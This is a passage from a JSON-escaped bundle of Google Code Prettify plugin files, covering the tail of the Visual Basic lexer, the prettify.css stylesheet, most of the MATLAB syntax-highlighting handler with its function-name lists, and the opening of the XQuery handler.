/^(?:True\\b|False\\b|Nothing\\b|\\d+(?:E[+\\-]?\\d+[FRD]?|[FRDSIL])?|(?:&H[0-9A-F]+|&O[0-7]+)[SIL]?|\\d*\\.\\d+(?:E[+\\-]?\\d+)?[FRD]?|#\\s+(?:\\d+[\\-\\/]\\d+[\\-\\/]\\d+(?:\\s+\\d+:\\d+(?::\\d+)?(\\s*(?:AM|PM))?)?|\\d+:\\d+(?::\\d+)?(\\s*(?:AM|PM))?)\\s+#)/i], // An identifier. Keywords can be turned into identifers // with square brackets, and there may be optional type // characters after a normal identifier in square brackets. [PR['PR_PLAIN'], /^(?:(?:[a-z]|_\\w)\\w*(?:\\[[%&@!#]+\\])?|\\[(?:[a-z]|_\\w)\\w*\\])/i], // A run of punctuation [PR['PR_PUNCTUATION'], /^[^\\w\\t\\n\\r \\\"\\'\\[\\]\\xA0\\u2018\\u2019\\u201C\\u201D\\u2028\\u2029]+/], // Square brackets [PR['PR_PUNCTUATION'], /^(?:\\[|\\])/] ]), ['vb', 'vbs']);","path":"plugins/prettify/lang-vb.js"},{"title":"","text":"/** * @license * Copyright (C) 2015 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /* Pretty printing styles. Used with prettify.js. */ /* SPAN elements with the classes below are added by prettyprint. */ .pln { color: #000 } /* plain text */ @media screen { .str { color: #080 } /* string content */ .kwd { color: #008 } /* a keyword */ .com { color: #800 } /* a comment */ .typ { color: #606 } /* a type name */ .lit { color: #066 } /* a literal value */ /* punctuation, lisp open bracket, lisp close bracket */ .pun, .opn, .clo { color: #660 } .tag { color: #008 } /* a markup tag name */ .atn { color: #606 } /* a markup attribute name */ .atv { color: #080 } /* a markup attribute value */ .dec, .var { color: #606 } /* a declaration; a variable name */ .fun { color: red } /* a function name */ } /* Use higher contrast and text-weight for printable form. */ @media print, projection { .str { color: #060 } .kwd { color: #006; font-weight: bold } .com { color: #600; font-style: italic } .typ { color: #404; font-weight: bold } .lit { color: #044 } .pun, .opn, .clo { color: #440 } .tag { color: #006; font-weight: bold } .atn { color: #404 } .atv { color: #060 } } /* Put a border around prettyprinted code snippets. */ pre.prettyprint { padding: 2px; border: 1px solid #888 } /* Specify class=linenums on a pre to get line numbering */ ol.linenums { margin-top: 0; margin-bottom: 0 } /* IE indents via margin-left */ li.L0, li.L1, li.L2, li.L3, li.L5, li.L6, li.L7, li.L8 { list-style-type: none } /* Alternate shading for lines */ li.L1, li.L3, li.L5, li.L7, li.L9 { background: #eee }","path":"plugins/prettify/prettify.css"},{"title":"","text":"/** * @license * Copyright (c) 2013 by Amro * * Permission is hereby granted, free of charge, to any person obtaining a copy * of this software and associated documentation files (the \"Software\"), to deal * in the Software without restriction, including without limitation the rights * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell * copies of the Software, and to permit persons to whom the Software is * furnished to do so, subject to the following conditions: * * The above copyright notice and this permission notice shall be included in * all copies or substantial portions of the Software. * * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN * THE SOFTWARE. */ /** * @fileoverview * Registers a language handler for MATLAB. * * To use, include prettify.js and this file in your HTML page. * Then put your code inside an HTML tag like * * * * @see https://github.com/amroamroamro/prettify-matlab */ (function (PR) { /* PR_PLAIN: plain text PR_STRING: string literals PR_KEYWORD: keywords PR_COMMENT: comments PR_TYPE: types PR_LITERAL: literal values (1, null, true, ..) PR_PUNCTUATION: punctuation string PR_SOURCE: embedded source PR_DECLARATION: markup declaration such as a DOCTYPE PR_TAG: sgml tag PR_ATTRIB_NAME: sgml attribute name PR_ATTRIB_VALUE: sgml attribute value */ var PR_IDENTIFIER = \"ident\", PR_CONSTANT = \"const\", PR_FUNCTION = \"fun\", PR_FUNCTION_TOOLBOX = \"fun_tbx\", PR_SYSCMD = \"syscmd\", PR_CODE_OUTPUT = \"codeoutput\", PR_ERROR = \"err\", PR_WARNING = \"wrn\", PR_TRANSPOSE = \"transpose\", PR_LINE_CONTINUATION = \"linecont\"; // Refer to: http://www.mathworks.com/help/matlab/functionlist-alpha.html var coreFunctions = [ 'abs|accumarray|acos(?:d|h)?|acot(?:d|h)?|acsc(?:d|h)?|actxcontrol(?:list|select)?|actxGetRunningServer|actxserver|addlistener|addpath|addpref|addtodate|airy|align|alim|all|allchild|alpha|alphamap|amd|ancestor|and|angle|annotation|any|area|arrayfun|asec(?:d|h)?|asin(?:d|h)?|assert|assignin|atan(?:2|d|h)?|audiodevinfo|audioplayer|audiorecorder|aufinfo|auread|autumn|auwrite|avifile|aviinfo|aviread|axes|axis|balance|bar(?:3|3h|h)?|base2dec|beep|BeginInvoke|bench|bessel(?:h|i|j|k|y)|beta|betainc|betaincinv|betaln|bicg|bicgstab|bicgstabl|bin2dec|bitand|bitcmp|bitget|bitmax|bitnot|bitor|bitset|bitshift|bitxor|blanks|blkdiag|bone|box|brighten|brush|bsxfun|builddocsearchdb|builtin|bvp4c|bvp5c|bvpget|bvpinit|bvpset|bvpxtend|calendar|calllib|callSoapService|camdolly|cameratoolbar|camlight|camlookat|camorbit|campan|campos|camproj|camroll|camtarget|camup|camva|camzoom|cart2pol|cart2sph|cast|cat|caxis|cd|cdf2rdf|cdfepoch|cdfinfo|cdflib(?:\\.(?:close|closeVar|computeEpoch|computeEpoch16|create|createAttr|createVar|delete|deleteAttr|deleteAttrEntry|deleteAttrgEntry|deleteVar|deleteVarRecords|epoch16Breakdown|epochBreakdown|getAttrEntry|getAttrgEntry|getAttrMaxEntry|getAttrMaxgEntry|getAttrName|getAttrNum|getAttrScope|getCacheSize|getChecksum|getCompression|getCompressionCacheSize|getConstantNames|getConstantValue|getCopyright|getFileBackward|getFormat|getLibraryCopyright|getLibraryVersion|getMajority|getName|getNumAttrEntries|getNumAttrgEntries|getNumAttributes|getNumgAttributes|getReadOnlyMode|getStageCacheSize|getValidate|getVarAllocRecords|getVarBlockingFactor|getVarCacheSize|getVarCompression|getVarData|getVarMaxAllocRecNum|getVarMaxWrittenRecNum|getVarName|getVarNum|getVarNumRecsWritten|getVarPadValue|getVarRecordData|getVarReservePercent|getVarsMaxWrittenRecNum|getVarSparseRecords|getVersion|hyperGetVarData|hyperPutVarData|inquire|inquireAttr|inquireAttrEntry|inquireAttrgEntry|inquireVar|open|putAttrEntry|putAttrgEntry|putVarData|putVarRecordData|renameAttr|renameVar|setCacheSize|setChecksum|setCompression|setCompressionCacheSize|setFileBackward|setFormat|setMajority|setReadOnlyMode|setStageCacheSize|setValidate|setVarAllocBlockRecords|setVarBlockingFactor|setVarCacheSize|setVarCompression|setVarInitialRecs|setVarPadValue|SetVarReservePercent|setVarsCacheSize|setVarSparseRecords))?|cdfread|cdfwrite|ceil|cell2mat|cell2struct|celldisp|cellfun|cellplot|cellstr|cgs|checkcode|checkin|checkout|chol|cholinc|cholupdate|circshift|cla|clabel|class|clc|clear|clearvars|clf|clipboard|clock|close|closereq|cmopts|cmpermute|cmunique|colamd|colon|colorbar|colordef|colormap|colormapeditor|colperm|Combine|comet|comet3|commandhistory|commandwindow|compan|compass|complex|computer|cond|condeig|condest|coneplot|conj|containers\\.Map|contour(?:3|c|f|slice)?|contrast|conv|conv2|convhull|convhulln|convn|cool|copper|copyfile|copyobj|corrcoef|cos(?:d|h)?|cot(?:d|h)?|cov|cplxpair|cputime|createClassFromWsdl|createSoapMessage|cross|csc(?:d|h)?|csvread|csvwrite|ctranspose|cumprod|cumsum|cumtrapz|curl|customverctrl|cylinder|daqread|daspect|datacursormode|datatipinfo|date|datenum|datestr|datetick|datevec|dbclear|dbcont|dbdown|dblquad|dbmex|dbquit|dbstack|dbstatus|dbstep|dbstop|dbtype|dbup|dde23|ddeget|ddesd|ddeset|deal|deblank|dec2base|dec2bin|dec2hex|decic|deconv|del2|delaunay|delaunay3|delaunayn|DelaunayTri|delete|demo|depdir|depfun|det|detrend|deval|diag|dialog|diary|diff|diffuse|dir|disp|display|dither|divergence|dlmread|dlmwrite|dmperm|doc|docsearch|dos|dot|dragrect|drawnow|dsearch|dsearchn|dynamicprops|echo|echodemo|edit|eig|eigs|ellipj|ellipke|ellipsoid|empty|enableNETfromNetworkDrive|enableservice|EndInvoke|enumeration|eomday|eq|erf|erfc|erfcinv|erfcx|erfinv|error|errorbar|errordlg|etime|etree|etreeplot|eval|evalc|evalin|event\\.(?:EventData|listener|PropertyEvent|proplistener)|exifread|exist|exit|exp|expint|expm|expm1|export2wsdlg|eye|ezcontour|ezcontourf|ezmesh|ezmeshc|ezplot|ezplot3|ezpolar|ezsurf|ezsurfc|factor|factorial|fclose|feather|feature|feof|ferror|feval|fft|fft2|fftn|fftshift|fftw|fgetl|fgets|fieldnames|figure|figurepalette|fileattrib|filebrowser|filemarker|fileparts|fileread|filesep|fill|fill3|filter|filter2|find|findall|findfigs|findobj|findstr|finish|fitsdisp|fitsinfo|fitsread|fitswrite|fix|flag|flipdim|fliplr|flipud|floor|flow|fminbnd|fminsearch|fopen|format|fplot|fprintf|frame2im|fread|freqspace|frewind|fscanf|fseek|ftell|FTP|full|fullfile|func2str|functions|funm|fwrite|fzero|gallery|gamma|gammainc|gammaincinv|gammaln|gca|gcbf|gcbo|gcd|gcf|gco|ge|genpath|genvarname|get|getappdata|getenv|getfield|getframe|getpixelposition|getpref|ginput|gmres|gplot|grabcode|gradient|gray|graymon|grid|griddata(?:3|n)?|griddedInterpolant|gsvd|gt|gtext|guidata|guide|guihandles|gunzip|gzip|h5create|h5disp|h5info|h5read|h5readatt|h5write|h5writeatt|hadamard|handle|hankel|hdf|hdf5|hdf5info|hdf5read|hdf5write|hdfinfo|hdfread|hdftool|help|helpbrowser|helpdesk|helpdlg|helpwin|hess|hex2dec|hex2num|hgexport|hggroup|hgload|hgsave|hgsetget|hgtransform|hidden|hilb|hist|histc|hold|home|horzcat|hostid|hot|hsv|hsv2rgb|hypot|ichol|idivide|ifft|ifft2|ifftn|ifftshift|ilu|im2frame|im2java|imag|image|imagesc|imapprox|imfinfo|imformats|import|importdata|imread|imwrite|ind2rgb|ind2sub|inferiorto|info|inline|inmem|inpolygon|input|inputdlg|inputname|inputParser|inspect|instrcallback|instrfind|instrfindall|int2str|integral(?:2|3)?|interp(?:1|1q|2|3|ft|n)|interpstreamspeed|intersect|intmax|intmin|inv|invhilb|ipermute|isa|isappdata|iscell|iscellstr|ischar|iscolumn|isdir|isempty|isequal|isequaln|isequalwithequalnans|isfield|isfinite|isfloat|isglobal|ishandle|ishghandle|ishold|isinf|isinteger|isjava|iskeyword|isletter|islogical|ismac|ismatrix|ismember|ismethod|isnan|isnumeric|isobject|isocaps|isocolors|isonormals|isosurface|ispc|ispref|isprime|isprop|isreal|isrow|isscalar|issorted|isspace|issparse|isstr|isstrprop|isstruct|isstudent|isunix|isvarname|isvector|javaaddpath|javaArray|javachk|javaclasspath|javacomponent|javaMethod|javaMethodEDT|javaObject|javaObjectEDT|javarmpath|jet|keyboard|kron|lasterr|lasterror|lastwarn|lcm|ldivide|ldl|le|legend|legendre|length|libfunctions|libfunctionsview|libisloaded|libpointer|libstruct|license|light|lightangle|lighting|lin2mu|line|lines|linkaxes|linkdata|linkprop|linsolve|linspace|listdlg|listfonts|load|loadlibrary|loadobj|log|log10|log1p|log2|loglog|logm|logspace|lookfor|lower|ls|lscov|lsqnonneg|lsqr|lt|lu|luinc|magic|makehgtform|mat2cell|mat2str|material|matfile|matlab\\.io\\.MatFile|matlab\\.mixin\\.(?:Copyable|Heterogeneous(?:\\.getDefaultScalarElement)?)|matlabrc|matlabroot|max|maxNumCompThreads|mean|median|membrane|memmapfile|memory|menu|mesh|meshc|meshgrid|meshz|meta\\.(?:class(?:\\.fromName)?|DynamicProperty|EnumeratedValue|event|MetaData|method|package(?:\\.(?:fromName|getAllPackages))?|property)|metaclass|methods|methodsview|mex(?:\\.getCompilerConfigurations)?|MException|mexext|mfilename|min|minres|minus|mislocked|mkdir|mkpp|mldivide|mlint|mlintrpt|mlock|mmfileinfo|mmreader|mod|mode|more|move|movefile|movegui|movie|movie2avi|mpower|mrdivide|msgbox|mtimes|mu2lin|multibandread|multibandwrite|munlock|namelengthmax|nargchk|narginchk|nargoutchk|native2unicode|nccreate|ncdisp|nchoosek|ncinfo|ncread|ncreadatt|ncwrite|ncwriteatt|ncwriteschema|ndgrid|ndims|ne|NET(?:\\.(?:addAssembly|Assembly|convertArray|createArray|createGeneric|disableAutoRelease|enableAutoRelease|GenericClass|invokeGenericMethod|NetException|setStaticProperty))?|netcdf\\.(?:abort|close|copyAtt|create|defDim|defGrp|defVar|defVarChunking|defVarDeflate|defVarFill|defVarFletcher32|delAtt|endDef|getAtt|getChunkCache|getConstant|getConstantNames|getVar|inq|inqAtt|inqAttID|inqAttName|inqDim|inqDimID|inqDimIDs|inqFormat|inqGrpName|inqGrpNameFull|inqGrpParent|inqGrps|inqLibVers|inqNcid|inqUnlimDims|inqVar|inqVarChunking|inqVarDeflate|inqVarFill|inqVarFletcher32|inqVarID|inqVarIDs|open|putAtt|putVar|reDef|renameAtt|renameDim|renameVar|setChunkCache|setDefaultFormat|setFill|sync)|newplot|nextpow2|nnz|noanimate|nonzeros|norm|normest|not|notebook|now|nthroot|null|num2cell|num2hex|num2str|numel|nzmax|ode(?:113|15i|15s|23|23s|23t|23tb|45)|odeget|odeset|odextend|onCleanup|ones|open|openfig|opengl|openvar|optimget|optimset|or|ordeig|orderfields|ordqz|ordschur|orient|orth|pack|padecoef|pagesetupdlg|pan|pareto|parseSoapResponse|pascal|patch|path|path2rc|pathsep|pathtool|pause|pbaspect|pcg|pchip|pcode|pcolor|pdepe|pdeval|peaks|perl|perms|permute|pie|pink|pinv|planerot|playshow|plot|plot3|plotbrowser|plotedit|plotmatrix|plottools|plotyy|plus|pol2cart|polar|poly|polyarea|polyder|polyeig|polyfit|polyint|polyval|polyvalm|pow2|power|ppval|prefdir|preferences|primes|print|printdlg|printopt|printpreview|prod|profile|profsave|propedit|propertyeditor|psi|publish|PutCharArray|PutFullMatrix|PutWorkspaceData|pwd|qhull|qmr|qr|qrdelete|qrinsert|qrupdate|quad|quad2d|quadgk|quadl|quadv|questdlg|quit|quiver|quiver3|qz|rand|randi|randn|randperm|RandStream(?:\\.(?:create|getDefaultStream|getGlobalStream|list|setDefaultStream|setGlobalStream))?|rank|rat|rats|rbbox|rcond|rdivide|readasync|real|reallog|realmax|realmin|realpow|realsqrt|record|rectangle|rectint|recycle|reducepatch|reducevolume|refresh|refreshdata|regexp|regexpi|regexprep|regexptranslate|rehash|rem|Remove|RemoveAll|repmat|reset|reshape|residue|restoredefaultpath|rethrow|rgb2hsv|rgb2ind|rgbplot|ribbon|rmappdata|rmdir|rmfield|rmpath|rmpref|rng|roots|rose|rosser|rot90|rotate|rotate3d|round|rref|rsf2csf|run|save|saveas|saveobj|savepath|scatter|scatter3|schur|sec|secd|sech|selectmoveresize|semilogx|semilogy|sendmail|serial|set|setappdata|setdiff|setenv|setfield|setpixelposition|setpref|setstr|setxor|shading|shg|shiftdim|showplottool|shrinkfaces|sign|sin(?:d|h)?|size|slice|smooth3|snapnow|sort|sortrows|sound|soundsc|spalloc|spaugment|spconvert|spdiags|specular|speye|spfun|sph2cart|sphere|spinmap|spline|spones|spparms|sprand|sprandn|sprandsym|sprank|spring|sprintf|spy|sqrt|sqrtm|squeeze|ss2tf|sscanf|stairs|startup|std|stem|stem3|stopasync|str2double|str2func|str2mat|str2num|strcat|strcmp|strcmpi|stream2|stream3|streamline|streamparticles|streamribbon|streamslice|streamtube|strfind|strjust|strmatch|strncmp|strncmpi|strread|strrep|strtok|strtrim|struct2cell|structfun|strvcat|sub2ind|subplot|subsasgn|subsindex|subspace|subsref|substruct|subvolume|sum|summer|superclasses|superiorto|support|surf|surf2patch|surface|surfc|surfl|surfnorm|svd|svds|swapbytes|symamd|symbfact|symmlq|symrcm|symvar|system|tan(?:d|h)?|tar|tempdir|tempname|tetramesh|texlabel|text|textread|textscan|textwrap|tfqmr|throw|tic|Tiff(?:\\.(?:getTagNames|getVersion))?|timer|timerfind|timerfindall|times|timeseries|title|toc|todatenum|toeplitz|toolboxdir|trace|transpose|trapz|treelayout|treeplot|tril|trimesh|triplequad|triplot|TriRep|TriScatteredInterp|trisurf|triu|tscollection|tsearch|tsearchn|tstool|type|typecast|uibuttongroup|uicontextmenu|uicontrol|uigetdir|uigetfile|uigetpref|uiimport|uimenu|uiopen|uipanel|uipushtool|uiputfile|uiresume|uisave|uisetcolor|uisetfont|uisetpref|uistack|uitable|uitoggletool|uitoolbar|uiwait|uminus|undocheckout|unicode2native|union|unique|unix|unloadlibrary|unmesh|unmkpp|untar|unwrap|unzip|uplus|upper|urlread|urlwrite|usejava|userpath|validateattributes|validatestring|vander|var|vectorize|ver|verctrl|verLessThan|version|vertcat|VideoReader(?:\\.isPlatformSupported)?|VideoWriter(?:\\.getProfiles)?|view|viewmtx|visdiff|volumebounds|voronoi|voronoin|wait|waitbar|waitfor|waitforbuttonpress|warndlg|warning|waterfall|wavfinfo|wavplay|wavread|wavrecord|wavwrite|web|weekday|what|whatsnew|which|whitebg|who|whos|wilkinson|winopen|winqueryreg|winter|wk1finfo|wk1read|wk1write|workspace|xlabel|xlim|xlsfinfo|xlsread|xlswrite|xmlread|xmlwrite|xor|xslt|ylabel|ylim|zeros|zip|zlabel|zlim|zoom' ].join(\"|\"); var statsFunctions = [ 'addedvarplot|andrewsplot|anova(?:1|2|n)|ansaribradley|aoctool|barttest|bbdesign|beta(?:cdf|fit|inv|like|pdf|rnd|stat)|bino(?:cdf|fit|inv|pdf|rnd|stat)|biplot|bootci|bootstrp|boxplot|candexch|candgen|canoncorr|capability|capaplot|caseread|casewrite|categorical|ccdesign|cdfplot|chi2(?:cdf|gof|inv|pdf|rnd|stat)|cholcov|Classification(?:BaggedEnsemble|Discriminant(?:\\.(?:fit|make|template))?|Ensemble|KNN(?:\\.(?:fit|template))?|PartitionedEnsemble|PartitionedModel|Tree(?:\\.(?:fit|template))?)|classify|classregtree|cluster|clusterdata|cmdscale|combnk|Compact(?:Classification(?:Discriminant|Ensemble|Tree)|Regression(?:Ensemble|Tree)|TreeBagger)|confusionmat|controlchart|controlrules|cophenet|copula(?:cdf|fit|param|pdf|rnd|stat)|cordexch|corr|corrcov|coxphfit|createns|crosstab|crossval|cvpartition|datasample|dataset|daugment|dcovary|dendrogram|dfittool|disttool|dummyvar|dwtest|ecdf|ecdfhist|ev(?:cdf|fit|inv|like|pdf|rnd|stat)|ExhaustiveSearcher|exp(?:cdf|fit|inv|like|pdf|rnd|stat)|factoran|fcdf|ff2n|finv|fitdist|fitensemble|fpdf|fracfact|fracfactgen|friedman|frnd|fstat|fsurfht|fullfact|gagerr|gam(?:cdf|fit|inv|like|pdf|rnd|stat)|GeneralizedLinearModel(?:\\.fit)?|geo(?:cdf|inv|mean|pdf|rnd|stat)|gev(?:cdf|fit|inv|like|pdf|rnd|stat)|gline|glmfit|glmval|glyphplot|gmdistribution(?:\\.fit)?|gname|gp(?:cdf|fit|inv|like|pdf|rnd|stat)|gplotmatrix|grp2idx|grpstats|gscatter|haltonset|harmmean|hist3|histfit|hmm(?:decode|estimate|generate|train|viterbi)|hougen|hyge(?:cdf|inv|pdf|rnd|stat)|icdf|inconsistent|interactionplot|invpred|iqr|iwishrnd|jackknife|jbtest|johnsrnd|KDTreeSearcher|kmeans|knnsearch|kruskalwallis|ksdensity|kstest|kstest2|kurtosis|lasso|lassoglm|lassoPlot|leverage|lhsdesign|lhsnorm|lillietest|LinearModel(?:\\.fit)?|linhyptest|linkage|logn(?:cdf|fit|inv|like|pdf|rnd|stat)|lsline|mad|mahal|maineffectsplot|manova1|manovacluster|mdscale|mhsample|mle|mlecov|mnpdf|mnrfit|mnrnd|mnrval|moment|multcompare|multivarichart|mvn(?:cdf|pdf|rnd)|mvregress|mvregresslike|mvt(?:cdf|pdf|rnd)|NaiveBayes(?:\\.fit)?|nan(?:cov|max|mean|median|min|std|sum|var)|nbin(?:cdf|fit|inv|pdf|rnd|stat)|ncf(?:cdf|inv|pdf|rnd|stat)|nct(?:cdf|inv|pdf|rnd|stat)|ncx2(?:cdf|inv|pdf|rnd|stat)|NeighborSearcher|nlinfit|nlintool|nlmefit|nlmefitsa|nlparci|nlpredci|nnmf|nominal|NonLinearModel(?:\\.fit)?|norm(?:cdf|fit|inv|like|pdf|rnd|stat)|normplot|normspec|ordinal|outlierMeasure|parallelcoords|paretotails|partialcorr|pcacov|pcares|pdf|pdist|pdist2|pearsrnd|perfcurve|perms|piecewisedistribution|plsregress|poiss(?:cdf|fit|inv|pdf|rnd|tat)|polyconf|polytool|prctile|princomp|ProbDist(?:Kernel|Parametric|UnivKernel|UnivParam)?|probplot|procrustes|qqplot|qrandset|qrandstream|quantile|randg|random|randsample|randtool|range|rangesearch|ranksum|rayl(?:cdf|fit|inv|pdf|rnd|stat)|rcoplot|refcurve|refline|regress|Regression(?:BaggedEnsemble|Ensemble|PartitionedEnsemble|PartitionedModel|Tree(?:\\.(?:fit|template))?)|regstats|relieff|ridge|robustdemo|robustfit|rotatefactors|rowexch|rsmdemo|rstool|runstest|sampsizepwr|scatterhist|sequentialfs|signrank|signtest|silhouette|skewness|slicesample|sobolset|squareform|statget|statset|stepwise|stepwisefit|surfht|tabulate|tblread|tblwrite|tcdf|tdfread|tiedrank|tinv|tpdf|TreeBagger|treedisp|treefit|treeprune|treetest|treeval|trimmean|trnd|tstat|ttest|ttest2|unid(?:cdf|inv|pdf|rnd|stat)|unif(?:cdf|inv|it|pdf|rnd|stat)|vartest(?:2|n)?|wbl(?:cdf|fit|inv|like|pdf|rnd|stat)|wblplot|wishrnd|x2fx|xptread|zscore|ztest' ].join(\"|\"); var imageFunctions = [ 'adapthisteq|analyze75info|analyze75read|applycform|applylut|axes2pix|bestblk|blockproc|bwarea|bwareaopen|bwboundaries|bwconncomp|bwconvhull|bwdist|bwdistgeodesic|bweuler|bwhitmiss|bwlabel|bwlabeln|bwmorph|bwpack|bwperim|bwselect|bwtraceboundary|bwulterode|bwunpack|checkerboard|col2im|colfilt|conndef|convmtx2|corner|cornermetric|corr2|cp2tform|cpcorr|cpselect|cpstruct2pairs|dct2|dctmtx|deconvblind|deconvlucy|deconvreg|deconvwnr|decorrstretch|demosaic|dicom(?:anon|dict|info|lookup|read|uid|write)|edge|edgetaper|entropy|entropyfilt|fan2para|fanbeam|findbounds|fliptform|freqz2|fsamp2|fspecial|ftrans2|fwind1|fwind2|getheight|getimage|getimagemodel|getline|getneighbors|getnhood|getpts|getrangefromclass|getrect|getsequence|gray2ind|graycomatrix|graycoprops|graydist|grayslice|graythresh|hdrread|hdrwrite|histeq|hough|houghlines|houghpeaks|iccfind|iccread|iccroot|iccwrite|idct2|ifanbeam|im2bw|im2col|im2double|im2int16|im2java2d|im2single|im2uint16|im2uint8|imabsdiff|imadd|imadjust|ImageAdapter|imageinfo|imagemodel|imapplymatrix|imattributes|imbothat|imclearborder|imclose|imcolormaptool|imcomplement|imcontour|imcontrast|imcrop|imdilate|imdisplayrange|imdistline|imdivide|imellipse|imerode|imextendedmax|imextendedmin|imfill|imfilter|imfindcircles|imfreehand|imfuse|imgca|imgcf|imgetfile|imhandles|imhist|imhmax|imhmin|imimposemin|imlincomb|imline|immagbox|immovie|immultiply|imnoise|imopen|imoverview|imoverviewpanel|impixel|impixelinfo|impixelinfoval|impixelregion|impixelregionpanel|implay|impoint|impoly|impositionrect|improfile|imputfile|impyramid|imreconstruct|imrect|imregconfig|imregionalmax|imregionalmin|imregister|imresize|imroi|imrotate|imsave|imscrollpanel|imshow|imshowpair|imsubtract|imtool|imtophat|imtransform|imview|ind2gray|ind2rgb|interfileinfo|interfileread|intlut|ippl|iptaddcallback|iptcheckconn|iptcheckhandle|iptcheckinput|iptcheckmap|iptchecknargin|iptcheckstrs|iptdemos|iptgetapi|iptGetPointerBehavior|iptgetpref|ipticondir|iptnum2ordinal|iptPointerManager|iptprefs|iptremovecallback|iptSetPointerBehavior|iptsetpref|iptwindowalign|iradon|isbw|isflat|isgray|isicc|isind|isnitf|isrgb|isrset|lab2double|lab2uint16|lab2uint8|label2rgb|labelmatrix|makecform|makeConstrainToRectFcn|makehdr|makelut|makeresampler|maketform|mat2gray|mean2|medfilt2|montage|nitfinfo|nitfread|nlfilter|normxcorr2|ntsc2rgb|openrset|ordfilt2|otf2psf|padarray|para2fan|phantom|poly2mask|psf2otf|qtdecomp|qtgetblk|qtsetblk|radon|rangefilt|reflect|regionprops|registration\\.metric\\.(?:MattesMutualInformation|MeanSquares)|registration\\.optimizer\\.(?:OnePlusOneEvolutionary|RegularStepGradientDescent)|rgb2gray|rgb2ntsc|rgb2ycbcr|roicolor|roifill|roifilt2|roipoly|rsetwrite|std2|stdfilt|strel|stretchlim|subimage|tformarray|tformfwd|tforminv|tonemap|translate|truesize|uintlut|viscircles|warp|watershed|whitepoint|wiener2|xyz2double|xyz2uint16|ycbcr2rgb' ].join(\"|\"); var optimFunctions = [ 'bintprog|color|fgoalattain|fminbnd|fmincon|fminimax|fminsearch|fminunc|fseminf|fsolve|fzero|fzmult|gangstr|ktrlink|linprog|lsqcurvefit|lsqlin|lsqnonlin|lsqnonneg|optimget|optimset|optimtool|quadprog' ].join(\"|\"); // identifiers: variable/function name, or a chain of variable names joined by dots (obj.method, struct.field1.field2, etc..) // valid variable names (start with letter, and contains letters, digits, and underscores). // we match \"xx.yy\" as a whole so that if \"xx\" is plain and \"yy\" is not, we dont get a false positive for \"yy\" //var reIdent = '(?:[a-zA-Z][a-zA-Z0-9_]*)'; //var reIdentChain = '(?:' + reIdent + '(?:\\.' + reIdent + ')*' + ')'; // patterns that always start with a known character. Must have a shortcut string. var shortcutStylePatterns = [ // whitespaces: space, tab, carriage return, line feed, line tab, form-feed, non-break space [PR.PR_PLAIN, /^[ \\t\\r\\n\\v\\f\\xA0]+/, null, \" \\t\\r\\n\\u000b\\u000c\\u00a0\"], // block comments //TODO: chokes on nested block comments //TODO: false positives when the lines with %{ and %} contain non-spaces //[PR.PR_COMMENT, /^%(?:[^\\{].*|\\{(?:%|%*[^\\}%])*(?:\\}+%?)?)/, null], [PR.PR_COMMENT, /^%\\{[^%]*%+(?:[^\\}%][^%]*%+)*\\}/, null], // single-line comments [PR.PR_COMMENT, /^%[^\\r\\n]*/, null, \"%\"], // system commands [PR_SYSCMD, /^![^\\r\\n]*/, null, \"!\"] ]; // patterns that will be tried in order if the shortcut ones fail. May have shortcuts. var fallthroughStylePatterns = [ // line continuation [PR_LINE_CONTINUATION, /^\\.\\.\\.\\s*[\\r\\n]/, null], // error message [PR_ERROR, /^\\?\\?\\? [^\\r\\n]*/, null], // warning message [PR_WARNING, /^Warning: [^\\r\\n]*/, null], // command prompt/output //[PR_CODE_OUTPUT, /^>>\\s+[^\\r\\n]*[\\r\\n]{1,2}[^=]*=[^\\r\\n]*[\\r\\n]{1,2}[^\\r\\n]*/, null], // full command output (both loose/compact format): `>> EXP\\nVAR =\\n VAL` [PR_CODE_OUTPUT, /^>>\\s+/, null], // only the command prompt `>> ` [PR_CODE_OUTPUT, /^octave:\\d+>\\s+/, null], // Octave command prompt `octave:1> ` // identifier (chain) or closing-parenthesis/brace/bracket, and IS followed by transpose operator // this way we dont misdetect the transpose operator ' as the start of a string [\"lang-matlab-operators\", /^((?:[a-zA-Z][a-zA-Z0-9_]*(?:\\.[a-zA-Z][a-zA-Z0-9_]*)*|\\)|\\]|\\}|\\.)')/, null], // identifier (chain), and NOT followed by transpose operator // this must come AFTER the \"is followed by transpose\" step (otherwise it chops the last char of identifier) [\"lang-matlab-identifiers\", /^([a-zA-Z][a-zA-Z0-9_]*(?:\\.[a-zA-Z][a-zA-Z0-9_]*)*)(?!')/, null], // single-quoted strings: allow for escaping with '', no multilines //[PR.PR_STRING, /(?:(?","path":"plugins/prettify/lang-matlab.js"},{"title":"","text":"/** * @license * Copyright (C) 2011 Patrick Wied * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for XQuery. * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * * * * @author Patrick Wied ( patpa7p@live.de ) * @version 2010-09-28 */ (function () { // Falls back to plain for stylesheets that don't style fun. var PR_FUNCTION = 'fun pln'; // Falls back to plaiin for stylesheets that don't style var. var PR_VARIABLE = 'var pln'; PR['registerLangHandler']( PR['createSimpleLexer']( [ // Matching $var-ia_bles [PR_VARIABLE, /^\\$[A-Za-z0-9_\\-]+/, null, \"$\"] ], [ // Matching lt and gt operators // Not the best matching solution but you have to differentiate between the gt 